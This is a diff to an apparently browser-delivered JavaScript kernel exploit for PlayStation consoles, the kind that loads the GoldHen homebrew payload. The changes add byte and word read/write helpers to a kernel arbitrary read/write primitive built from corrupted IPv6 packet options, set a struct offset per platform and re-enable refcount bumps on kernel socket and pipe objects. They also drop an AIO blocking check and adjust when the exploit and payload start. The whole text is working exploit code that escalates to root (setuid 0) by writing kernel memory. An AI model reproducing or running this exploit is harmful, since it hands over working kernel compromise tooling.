@@ -1470,6 +1470,16 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
             gsockopt(this.worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, buf);
         }
 
+        read8(addr) {
+            this._read(addr);
+            return this.rw_buf.read8(0);
+        }
+
+        read16(addr) {
+            this._read(addr);
+            return this.rw_buf.read16(0);
+        }
+
         read32(addr) {
             this._read(addr);
             return this.rw_buf.read32(0);
@@ -1478,6 +1488,16 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
         read64(addr) {
             this._read(addr);
             return this.rw_buf.read64(0);
+        }
+
+        write8(addr, value) {
+            this.rw_buf.write8(0, value);
+            this.copyin(this.rw_buf.addr, addr, 1);
+        }
+
+        write16(addr, value) {
+            this.rw_buf.write16(0, value);
+            this.copyin(this.rw_buf.addr, addr, 2);
         }
 
         write32(addr, value) {
@@ -1504,20 +1524,20 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     // RESTORE: clean corrupt pointer
      // pktopts.ip6po_rthdr = NULL
      //ABC Patch
-     const off_ip6po_rthdr = 0x68;
+     const off_ip6po_rthdr = is_ps4 ? 0x68 : 0x70;
      const r_rthdr_p = r_pktopts.add(off_ip6po_rthdr);
      const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
      kmem.write64(r_rthdr_p, 0);
      kmem.write64(w_rthdr_p, 0);
      log('corrupt pointers cleaned');
 
-    /*
+    
     // REMOVE once restore kernel is ready for production
     // increase the ref counts to prevent deallocation
     kmem.write32(main_sock, kmem.read32(main_sock) + 1);
     kmem.write32(worker_sock, kmem.read32(worker_sock) + 1);
     // +2 since we have to take into account the fget_write()'s reference
-    kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);*/
+    kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);
     
     return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
 }
@@ -1637,7 +1657,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     sysi('setuid', 0);
     showMessage("GoldHen Loaded Successfully !..."),    
     log('kernel exploit succeeded!');
-    toogle_payload();
+    setTimeout(toogle_payload, 1500);
     //alert("kernel exploit succeeded!");
 }
 
@@ -1659,20 +1679,6 @@ function setup(block_fd) {
         reqs1.write32(0x20 + i*0x28, block_fd);
     }
     aio_submit_cmd(AIO_CMD_READ, reqs1.addr, num_workers, block_id.addr);
-
-    {
-        const reqs1 = make_reqs1(1);
-        const timo = new Word(1);
-        const id = new Word();
-        aio_submit_cmd(AIO_CMD_READ, reqs1.addr, 1, id.addr);
-        chain.do_syscall_clear_errno(
-            'aio_multi_wait', id.addr, 1, _aio_errors_p, 1, timo.addr);
-        const err = chain.errno;
-        if (err !== 60) { // ETIMEDOUT
-            die(`SceAIO system not blocked. errno: ${err}`);
-        }
-        free_aios(id.addr, 1);
-    }
 
     log('heap grooming');
     // chosen to maximize the number of 0x80 malloc allocs per submission
@@ -1785,4 +1791,5 @@ export async function kexploit() {
         close(sd);
     }
 }
-setTimeout(kexploit, 1500);
+kexploit();
+//setTimeout(kexploit, 1500);
